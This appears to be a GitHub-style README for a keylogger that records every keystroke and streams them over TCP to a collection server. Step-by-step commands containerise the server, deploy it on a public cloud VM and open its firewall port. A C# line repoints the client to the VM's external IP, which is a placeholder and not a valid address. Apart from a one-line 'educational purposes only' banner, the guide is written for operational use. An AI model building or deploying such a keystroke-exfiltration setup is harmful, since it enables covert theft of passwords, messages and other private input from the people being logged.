> [!WARNING]
> For educational purposes only!

---

# Key Logger

This project includes a key logger client which logs all key strokes and a TCP server which accepts the incoming key stroke stream and writes it to a file.

---

# Setup

Here’s how to run the TCP server **locally** or inside a **Docker container** and deploy it to a cloud VM.

---

## Build and Test the Docker Image Locally

1. **Build the Server Project**:
   - Open a terminal in the server project directory and build the project:
     ```bash
     dotnet build
     ```

2. **Build the Docker Image**:
   - Create a Docker image:
     ```bash
     docker build -t keylogger-server .
     ```

3. **Run the Docker Container**:
   - Run the container and map the port `5000` from the container to the local machine:
     ```bash
     docker run -p 5000:5000 keylogger-server
     ```

4. **Test Locally**:
   - The server should now be running at `127.0.0.1:5000`.
   - Run the **keylogger client** and confirm it can connect to the server.

---

## Deploy to a Cloud VM

To deploy the server to a cloud-hosted VM:

1. **Provision a VM**:
   - Create a virtual machine using a cloud provider (AWS EC2, Azure VM, GCP Compute Engine).
   - Choose a VM image with **Docker installed** (e.g., Ubuntu with Docker pre-installed).

2. **Transfer the Docker Image**:
   - Log in to Docker Hub:
     ```bash
     docker login
     ```
   - Tag your image:
     ```bash
     docker tag keylogger-server <your-dockerhub-username>/keylogger-server:latest
     ```
   - Push the image:
     ```bash
     docker push <your-dockerhub-username>/keylogger-server:latest
     ```
   - On the VM, pull the image:
     ```bash
     docker pull <your-dockerhub-username>/keylogger-server:latest
     ```

3. **Run the Server Container on the VM**:
   - Start the server container and map port `5000`:
     ```bash
     docker run -p 5000:5000 keylogger-server
     ```

4. **Open the VM’s Firewall**:
   - Allow inbound traffic on **port 5000** in the cloud provider’s firewall settings so the client can connect.

5. **Find the External IP**:
   - Check the external (public) IP address of your VM.

---

## Update the Keylogger Client to Use the External IP

In the **keylogger client** project, replace `127.0.0.1` with the VM's external IP address:

```csharp
using TcpClient client = new TcpClient("123.456.78.90", 5000); // Replace with your VM's external IP
```

---

## Test the Entire Setup

1. Ensure the TCP server container is running on the cloud VM.
2. Run the keylogger client on your **local machine**.
3. Confirm the client connects to the server and sends the key data.
4. Check the server’s output (or the log file) on the VM.
